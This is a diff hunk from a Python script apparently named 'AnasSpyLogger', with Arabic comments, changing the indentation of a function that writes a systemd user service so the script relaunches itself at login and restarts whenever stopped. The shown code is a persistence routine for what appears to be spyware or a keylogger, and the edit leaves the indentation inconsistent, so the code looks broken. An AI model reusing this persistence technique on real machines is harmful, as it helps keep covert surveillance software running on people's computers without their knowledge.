@@ -150,25 +150,26 @@ def persist_script():
         service_file_path = os.path.join(user_service_path, "anaspylogger.service")
 
 
-service_content = f"""[Unit]
-Description=AnasSpyLogger Persistence Service
-After=network.target
+                service_content = f"""[Unit]
+        Description=AnasSpyLogger Persistence Service
+        After=network.target
 
-[Service]
-Type=simple
-ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
-Restart=always
-RestartSec=10
+        [Service]
+        Type=simple
+        ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
+        Restart=always
+        RestartSec=10
 
-[Install]
-WantedBy=default.target
-"""
+        [Install]
+        WantedBy=default.target
+        """
 
-        # إنشاء ملف الخدمة
+# إنشاء ملف الخدمة
         with open(service_file_path, 'w') as f:
             f.write(service_content)
 
         print(f"[+] Service created: {service_file_path}")
+
 
         # إعادة تحميل الخدمات الخاصة بالمستخدم
         subprocess.run(["systemctl", "--user", "daemon-reload"])
